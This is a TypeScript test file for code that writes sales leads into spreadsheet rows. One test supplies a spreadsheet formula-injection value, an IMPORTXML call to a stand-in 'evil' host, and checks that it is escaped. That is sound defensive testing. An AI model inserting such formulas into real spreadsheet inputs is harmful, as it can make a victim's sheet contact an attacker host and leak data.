import { test } from 'node:test'
import assert from 'node:assert/strict'
import { emptyLead, type Lead } from './lead.ts'
import { SHEET_HEADERS, leadToRow, shouldRecordLeads } from './sheet.ts'

const shopLead: Lead = {
  ...emptyLead,
  profile: 'shop',
  firstName: 'Awa',
  lastName: 'Koné',
  company: 'Boulangerie Awa',
  phone: '07 00 00 00 00',
  email: 'awa@mail.ci',
  shopType: 'Boulangerie',
  commune: 'Cocody',
  volume: '50 – 150',
  consent: true,
}

test('maps a lead to one cell per header, in order', () => {
  const row = leadToRow(shopLead, new Date('2026-11-17T10:00:00Z'))
  assert.equal(row.length, SHEET_HEADERS.length)
  assert.deepEqual(row, [
    '2026-11-17T10:00:00.000Z', 'shop', 'Awa', 'Koné', 'Boulangerie Awa',
    "'+225 07 00 00 00 00", 'awa@mail.ci', '', '', 'Boulangerie', 'Cocody', '50 – 150', 'yes',
  ])
})

test('joins advertiser communes', () => {
  const row = leadToRow({ ...shopLead, profile: 'advertiser', communes: ['Cocody', 'Plateau'] }, new Date(0))
  assert.equal(row[SHEET_HEADERS.indexOf('Target communes')], 'Cocody, Plateau')
})

test('neutralises cells that a spreadsheet would run as formulas', () => {
  const row = leadToRow({ ...shopLead, company: '=IMPORTXML("http://evil")', lastName: '@x' }, new Date(0))
  assert.equal(row[SHEET_HEADERS.indexOf('Company')], `'=IMPORTXML("http://evil")`)
  assert.equal(row[SHEET_HEADERS.indexOf('Last name')], "'@x")
})

test('records leads only on the Vercel production deployment', () => {
  assert.equal(shouldRecordLeads({ VERCEL_ENV: 'production' }), true)
  assert.equal(shouldRecordLeads({ VERCEL_ENV: 'preview' }), false)
  assert.equal(shouldRecordLeads({}), false)
})
